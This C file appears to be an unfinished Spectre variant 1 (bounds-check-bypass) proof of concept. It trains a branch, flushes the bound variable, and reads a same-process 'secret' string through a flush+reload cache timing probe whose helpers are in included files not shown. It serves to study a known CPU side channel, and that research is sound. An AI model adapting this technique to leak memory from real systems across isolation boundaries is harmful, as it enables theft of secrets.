#include <stdio.h>
#include <stdlib.h>

#include "gen_array.c"
#include "time_and_flush.c"

volatile char* ACCESSIBLE    = "notsecret";
volatile char* SECRET        = "zhis is a secret message";

int ACCESSIBLE_SIZE = 10;
int SECRET_SIZE     = 25;

int COMBINED_SIZE;

__attribute__((noinline)) void victim_func(int i, cp_t* arr) {

    //flush bound value
    flush((void*)&ACCESSIBLE_SIZE);
    __sync_synchronize();

    //access (possibly out of bounds)
    if (i < ACCESSIBLE_SIZE) {
        int x = ACCESSIBLE[i];
        volatile cp_t cp = arr[x];
    }
}
int* get_byte(int index) {

    cp_t *arr = mmap_arr_cache_pages();
    flush_arr(arr);
    __sync_synchronize();

    for(int i = 0; i < ACCESSIBLE_SIZE; i++) {
        victim_func(i, arr);
        __sync_synchronize();
        flush((void*)&arr[ACCESSIBLE[i]]);
    }

    //flush_arr((void*)arr);
    //__sync_synchronize();

    //__sync_synchronize();
    victim_func(index, arr);
    __sync_synchronize();

    int* results = reload(arr);
    unmap_cache_pages(arr);
    return results;
}

void print_arr(int* results) {
    //for(int i = 0; i < N_PAGES; i++) printf("%d, ", results[i]);

    printf("chars: ");
    for(int i = 0; i < N_PAGES; i++) {
        if(results[i] < 100) printf("'%c' (%d)\t", i, i);
    }
    printf("time for 1st secret char (t): %d\n", results[116]);
}

int main(int argc, char* argv[]) {
    COMBINED_SIZE = ACCESSIBLE_SIZE + SECRET_SIZE;
    for(int i = 0; i < COMBINED_SIZE; i++) printf("%c", ACCESSIBLE[i]); printf("\n");

    //printf("char1:  '%c' (%d)\n", ACCESSIBLE[0],  ACCESSIBLE[0]);
    printf("char10: '%c' (%d)\n", ACCESSIBLE[10], ACCESSIBLE[10]);
    int* results = get_byte(4);
    print_arr(results);
    //for(int i = ACCESSIBLE_SIZE+1; i < COMBINED_SIZE; i++) {
    //    int* results = get_byte(i);
    //    print_arr(results);
    //}
    free(results);
}